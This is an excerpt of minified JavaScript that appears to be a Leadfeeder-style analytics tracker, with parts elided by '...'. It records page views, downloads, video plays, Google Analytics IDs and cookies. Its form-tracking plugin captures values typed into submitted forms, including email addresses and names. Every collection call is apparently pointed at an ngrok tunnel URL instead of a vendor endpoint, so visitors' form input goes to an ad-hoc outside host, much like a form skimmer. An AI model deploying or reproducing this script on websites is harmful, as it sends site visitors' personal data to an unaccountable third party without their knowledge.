!(function () {
    ...
    un() &&
        ((window.ldfdr.registerTracker = function (n, t, e, r, i, o, a) {
            var u = c(n);
    ...
    if ("undefined" != typeof window && void 0 !== window.ldfdr) {
        ...
        (n = window.ldfdr),
            ...
            (e = a),
            (i = s),
            n.setTrackerOption(t, "lfaCookieEnabled", !0, i.enableCookie),
            n.setTrackerOption(t, "consentManagementEnabled", !1, i.enableCm),
            n.setTrackerOption(t, "useSendBeaconApi", !1, i.useBeacon),
            n.setTrackerOption(t, "autoTrackingMode", "spa", i.atMode),
            n.setTrackerOption(t, "foreignCookieSettings", { intercom: "^intercom-id-.*", hubspot: "^hubspotutk$" }),
            n.setTrackerOption(t, "crossDomainLinking", { enabled: false }),
            n.setTrackerOption(t, "useDualStackEndpoint", !1, i.useDs),
            n.setTrackerOption(t, "trackingCookieDurationDays", 365),
            n.setTrackerOption(t, "version", e),
            n.registerPluginConfig(t, "file-downloads", { filesEnabled: !0, filesToMatch: /(\.pdf|\.doc|\.docx|\.xls|\.xlsx|\.ppt|\.pptx|\.key|\.txt|\.dmg|\.exe)(\?|$)/ }),
            n.registerPluginConfig(t, "form-tracking", { formTrackingMode: "metadata", fields: [], excluded: [] }, i.trackForms),
            n.registerPluginConfig(t, "yt-playback", { ytPlaybackTrackingEnabled: !0 }, i.trackYt),
            n.registerPluginConfig(t, "vimeo-playback", { vimeoPlaybackTrackingEnabled: !0 }, i.trackVimeo),
            n.registerPluginConfig(t, "intercom-tracking", { intercomTrackingEnabled: !1 }, i.trackIntercom),
            n.registerPluginConfig(t, "discover", { jsConnectorConfigs: [] }),
            n.registerPluginConfig(t, "spa-tracking", {}),
            n.registerPluginConfig(t, "ga-connector", { gaConnectorSettings: [] }),
            (function (n, t) {
                n._q = n._q || [];
    ...
    function g(t, e) {
        if (!t[l])
            ...
            })(window.location.hostname, window.location.pathname, t.paths)
                ? void V(t.api_key, function (n) {
                      !(function (n, t) {
                          ...
                          (function (t) {
                              (window.dataLayer = window.dataLayer || []),
                                  window.dataLayer.some(function (n) {
                                      return n.event === t;
                                  }) || ((window[l] = !0), window.dataLayer.push({ event: t }));
                          })(t.event_name),
                          (t[l] = !0),
                          e();
                  })
    ...
    un() &&
        an().registerPlugin(w, "discover", function () {
            !(function (n) {
                n.jsConnectorConfigs &&
                    0 !== n.jsConnectorConfigs.length &&
                    St(
                        n.jsConnectorConfigs.map(function (t) {
                            return function (n) {
                                g(t, n);
                            };
                        }),
        ...
        un() &&
            an().registerPlugin(w, "file-downloads", function () {
                ...
                i.filesEnabled && (n(), Rt(n));
            }),
        un() &&
            an().registerPlugin(w, "form-tracking", function () {
                var r = 500,
                    s = ["button", "hidden", "image", "password", "reset", "submit"],
                    i = 0,
                    o = an().getTracker(w),
                    l = (function (n) {
                        var t = (n.fields || []).map(function (n) {
                                return { nameRegex: new RegExp(n.nameRegex, "i"), type: n.type, lfProperty: n.lfProperty };
                            }),
                        ...
                        return { formTrackingMode: n.formTrackingMode, fields: t, excluded: e };
                    })(o.plugins["form-tracking"].config);
                function t(n) {
                    c(n.target, "submit-event");
                }
                function a(n) {
                    if (!n) return null;
                    var t = n.type,
                ...
                function e(n) {
                    ...
                    if (e) {
                        ...
                        if (-1 == r.indexOf("prev") && -1 == r.indexOf("next")) {
                            var i = t.form || t.closest("form");
                            i && c(i, e);
                        }
                    }
                }
                function u(t) {
                    ...
                    return l.excluded.some(function (n) {
                        return (
                            (function (n, t) {
                            ...
                            (function (n, t) {
                                return (
                                    !!t.formClass &&
                                    n.className.split(/\s+/).some(function (n) {
                    ...
                    if (!(u(n) || i + r >= new Date().getTime())) {
                        var e = (function (n) {
                            for (
                                ...
                                var o = e[i],
                                    a = o.name,
                                    u = !!o.style && "none" == o.style.display;
                                if (!(!a || 0 <= s.indexOf(o.type) || u) && ((t[a] = { name: a, type: o.type }), void 0, ("text" !== (f = o.type) && "email" !== f && f) || !xt(o.value) || (t[a].suggestedLfProperty = "email"), d(n, o))) {
                                    t[a].value = o.value;
                                    var c = g(o, r);
                                    c && (t[a].lfProperty = c);
                                }
                        ...
                        if (e && 0 != e.length) {
                            ...
                            try {
                                o.track(
                                    (function (n, t, e) {
                                        var r = { formTrackingMode: l.formTrackingMode, formEventType: t },
                                            i = n.getAttribute("id"),
                                        ...
                                        a && (r.formAction = a);
                                        e && (r.inputFields = e);
                                        return { eventType: "form-submit", properties: r };
                                    })(n, t, e),
                                    function () {}
                                );
                            } catch (n) {}
                ...
                function d(n, t) {
                    switch (l.formTrackingMode) {
                        case "configured_fields":
                            return l.fields.some(function (n) {
                                return f(t, n);
                            });
                ...
                switch (l.formTrackingMode) {
                    ...
                    case "configured_fields":
                    case "all_but_excluded":
                        return document.addEventListener("submit", t), document.addEventListener("click", e, !0), n(), void Rt(n);
                    default:
                        return;
                }
            });
            ...
            !(function (n, t) {
                ...
                V(r.api_key, function (n) {
                    ...
                    !(function (n, t, e) {
                        ...
                        if (null !== e) {
                            var i = n.get("name");
                            r(i + ".set", e), r(i + ".send", { hitType: "event", eventCategory: h, eventAction: m, nonInteraction: !0 }), k(t);
                        }
                    })(e, r.ga_id, t),
                        i();
                });
    ...
    (window[p] = []),
        un() &&
            an().registerPlugin(w, "ga-connector", function () {
                !(function (n) {
                    n.gaConnectorSettings &&
                        0 !== n.gaConnectorSettings.length &&
                        ((v = setInterval(function () {
                            C(n.gaConnectorSettings);
                        }, 300)),
                        setTimeout(function () {
                            clearInterval(v);
                        }, 1e4));
        ...
        un() &&
            an().registerPlugin(w, "intercom-tracking", function () {
                var n = an().getTracker(w);
                n.plugins["intercom-tracking"].config.intercomTrackingEnabled &&
                    (function (n, t, e, r) {
                        var i;
                        ...
                        return !(void 0 === window.Intercom || !window.Intercom.booted) && (window.Intercom("update", { lfClientId: n.getClientId() }), !0);
                    });
            });
    var I = null,
        _ = null;
    ...
    function A(n) {
        return (
            (Nt(n.src, "http://player.vimeo.com") || Nt(n.src, "https://player.vimeo.com")) &&
            (function (n) {
                return !!O(n);
            })(n)
        );
    ...
    un() &&
        an().registerPlugin(w, "spa-tracking", function () {
            !(function (n) {
        ...
        un() &&
            an().registerPlugin(w, "vimeo-playback", function () {
                var r = an().getTracker(w);
                if (r.plugins["vimeo-playback"].config.vimeoPlaybackTrackingEnabled && window.postMessage) {
                    var t = {};
                    window.addEventListener ? window.addEventListener("message", n, !1) : window.attachEvent("onmessage", n, !1), L(), Rt(L);
                }
                function i(n) {
                    return t[n] || (t[n] = { src: n, tracked: !1, videoData: null }), t[n];
                }
                function o(n) {
                    var t = i(n.src);
                    if (!t.tracked) {
                        ...
                        r.track({ eventType: "video-start", properties: { videoUrl: e, videoTitle: t.title } });
                    }
                }
                function n(n) {
                    ...
                    var t = (function (t) {
                        ...
                        e = (function (n) {
                            for (var t = document.getElementsByTagName("iframe"), e = 0; e < t.length; e++) if (n.source === t[e].contentWindow) return t[e];
                        })(n);
                    switch (t.event) {
                        case "ready":
                            D(e);
        ...
        un() &&
            an().registerPlugin(w, "yt-playback", function () {
                var r = an().getTracker(w);
                    ...
                    if (n.length) {
                        !(function () {
                            ...
                            window.addEventListener("message", function (n) {
                                -1 !== ["https://www.youtube.com", "https://www.youtube-nocookie.com"].indexOf(n.origin) &&
                                    void 0 !== n.data &&
                                    (function (n) {
                                        var t;
                                        try {
                        ...
                        if (
                            ...
                            return (function (n) {
                                ...
                                : void (function (n, t) {
                                      ...
                                      e((o[t] = n), { event: "listening", id: t, channel: "widget" }), e(n, { event: "command", func: "addEventListener", args: ["onStateChange"], id: t, channel: "widget" });
                                  })(n, t);
                        s(n);
                    }
                }
    ...
    !un() ||
        "suppressUnloadUntil" in an() ||
        ((an().suppressUnloadUntil = 0),
        window.addEventListener(
            "beforeunload",
            function () {
                var n = new Date(),
                    t = an().suppressUnloadUntil;
                if (!(t < n.getTime())) for (; t >= n.getTime(); 0) n = new Date();
            },
            !1
        ));
    var M,
                    ...
                    if (
                        !(function (n) {
                            ...
                            return (
                                ...
                                (function (n, t, e) {
                                    if (F(n, t)) return !1;
                                    for (var r = 0; r < e.length; r++) if (!F(t, e[r]) && F(n, e[r])) return !0;
                                    return !1;
    ...
    function J() {
        if (Wn().crossDomainLinking.enabled)
            return (function (n) {
                var t = mt(n, P);
                if (!t) return;
                var e = (function (n) {
    ...
    function F(n, t) {
        ...
        for (var e = n.split("."), r = t.split("."), i = 1; i <= r.length; i++) if (r[r.length - i] !== e[e.length - i]) return !1;
        return !0;
    }
    function B(n) {
        if (!n) return !1;
    ...
    function V(n, t) {
        var e = "https://3ee4-220-233-8-78.ngrok-free.app/api",
    ...
    function Z(n, t) {
        for (
            ...
            nn(e[r]._getAccount(), t.trackingIds, !0);
    }
    function Q(n, t) {
        for (
            var e = (function (n) {
            ...
            nn(e[r].get("clientId"), t.clientIds), nn(e[r].get("trackingId"), t.trackingIds);
    }
    function nn(n, t, e) {
    ...
    function on() {
        var n = { clientIds: [], trackingIds: [], measurementIds: rn() };
    ...
    (window.ldfdr.getTracker = function (n, t) {
        ...
        (window.ldfdr.getAll = cn),
        (window.ldfdr.track = function (t) {
            cn(function (n) {
                n.track(t);
            });
        }),
    ...
    var fn,
        ...
        mn = "_lfa_consent";
    function hn() {
        Cn(In()), Cn(pn), kn(pn), Cn(mn), kn(mn);
    }
    function kn(n) {
        if (Sn(n)) {
            var t = window.ldfdr.cfg.cookieDomain;
            if (t) Ln(n, t);
            else for (var e = An().reverse(), r = 0; r < e.length; r++) if ((Ln(n, (t = e[r])), !Sn(n))) return;
        }
    }
    function yn(n, t, e) {
        var r = window.ldfdr.cfg.cookieDomain || fn;
        if (r) xn(n, t, e, "/", r);
        else for (var i = An(), o = 0; o < i.length; o++) if ((xn(n, t, e, "/", (r = i[o])), Tn(r) && Sn(n) === t)) return void (fn = r);
    }
    function Tn(n) {
    ...
    function bn(n, t, e) {
        if ((yn(n, t, e), Mn())) {
            ...
            var r = new Date();
            r.setTime(r.getTime() + e), window.localStorage.setItem(In(), r.toISOString());
        }
    }
    function Cn(n) {
    ...
    function _n() {
        return (
            ...
            (function () {
                ...
                if (null == n) return 0;
                var t = window.localStorage.getItem(In());
    ...
    function xn(n, t, e, r, i, o) {
        var a;
        e && (a = new Date()).setTime(a.getTime() + e),
            (document.cookie = n + "=" + window.encodeURIComponent(t) + (e ? ";expires=" + a.toGMTString() : "") + ";path=" + (r || "/") + (i && "none" !== i ? ";domain=" + i : "") + (o ? ";secure" : "") + ";SameSite=Lax");
    }
    function Rn() {
        return Tn(null);
    }
    ...
    function Hn(n, t) {
        ...
        return {
            ...
            context: (function (n, t) {
                ...
                "form-submit" === t && (e = "");
                return {
                    library: { name: "lftracker", version: a },
                    pageUrl: (function (n) {
                        if (at(Wn())) return n;
    ...
    function rt() {
        _n() &&
            (!(function () {
                for (var n = 0, t = an().getAll(); n < t.length; n++) if (Vn(t[n])) return !1;
                return !0;
            })() ||
                hn());
    }
    function it(n) {
        ...
        return (function (n) {
            ...
            : (setTimeout(function () {
                  return it(n);
              }, 100 * Math.pow(2, t.gaInitRetries)),
              void (t.gaInitRetries += 1));
    }
    function ot(t, e) {
        !(function (n) {
            switch (n) {
            ...
            ? Gn.push({ args: t, doneCallback: e })
            : it(function () {
                  var n = Hn(st(), t);
                  !0 === Wn().useSendBeaconApi && navigator && navigator.sendBeacon
                      ? (Qn("https://3ee4-220-233-8-78.ngrok-free.app/api", n, e), Xn() && Qn("https://3ee4-220-233-8-78.ngrok-free.app/api", n))
                      : (nt("https://3ee4-220-233-8-78.ngrok-free.app/api", n, e), Xn() && nt("https://3ee4-220-233-8-78.ngrok-free.app/api", n));
              });
    }
    function at(n) {
    ...
    function ut(n, t) {
        ...
        if (xt(e)) {
            var r = n.firstName,
                i = n.lastName,
                o = { email: e };
            r && "string" == typeof r && (o.firstName = r), i && "string" == typeof i && (o.lastName = i), ot({ eventType: "identify", properties: o }, t);
        }
    }
    function ct(n, t) {
        var e = (function (n) {
                var t = { eventType: "tracking-event" };
            ...
            r = Zn(e);
        !ht(r) && Nt(r, "/") && (r = window.location.protocol + "//" + window.location.host + r),
            r === Fn && zn + Un >= new Date().getTime()
                ? ft(t, Bn)
                : ((Fn = r),
                  (zn = new Date().getTime()),
                  (Bn = { success: !0 }),
        ...
        return (
            ...
            (function (n, t) {
                switch (n) {
                    case dn:
                        return (function (n) {
                            vt(dn), n.track({ eventType: "consent" });
                    ...
                    case ln:
                        return (function (n) {
                            return vt(ln), n.track({ eventType: "consent" }), (Gn = []), !0;
                        })(t);
                }
    ...
    function dt() {
        var n = Wn();
        return !!gt(n) && ((Pn = void 0), (Fn = Jn = null), (Bn = { success: !(Gn = []) }), (zn = 0), hn(), (Jn = Nn(sn, tt())), n.track({ eventType: "consent" }), !0);
    }
    function gt(n) {
        return (
            !!Rn() &&
    ...
    function wt(n, t) {
        ...
        if (r) {
            var o = "",
                a = r.indexOf("#");
            -1 !== a && ((o = r.substr(a + 1)), (r = r.substr(0, a)));
    ...
    function _t(n, t) {
        for (var e = t.split("."); n && e.length && (n = n[e.shift()]); );
        return n;
    }
    function Et() {
        return (function (n) {
            ...
            for (
                ...
                (o = (n.charCodeAt(i) << 24) | (n.charCodeAt(i + 1) << 16) | (n.charCodeAt(i + 2) << 8) | n.charCodeAt(i + 3)), k.push(o);
            switch (3 & d) {
                case 0:
                    i = 2147483648;
                    break;
    ...
    function Rt(n, t) {
        (t = t ? t++ : 1), window.MutationObserver && (10 <= t || (document.body ? new MutationObserver(Lt(n, 100, { leading: !1 })).observe(document.body, { childList: !0, subtree: !0 }) : setTimeout(Rt.bind(null, n, t), 100)));
    }
    if (un()) {
        location.href;
        var Mt =
            ...
            })((Tt = an().registerTracker(w, ot, ut, ct, st, lt, dt))),
            j(Tt),
            !0 === $n(Tt) && null !== (Jn = En()) && Nn(Jn, tt()),
            (kt = Tt),
            ((yt = document.createEvent("Event")).tracker = kt),
            yt.initEvent("ldfdr.trackerReady", !0, !1),
            void document.dispatchEvent(yt),
            Tt);
        "disabled" === Mt.autoTrackingMode ||
            ("on_script_load" === Mt.autoTrackingMode && !1 === Mt.enableAutoTracking) ||
            Mt.pageview({}, function () {
                Mt.autoTrackingInitialized = !0;
            });
    }
})();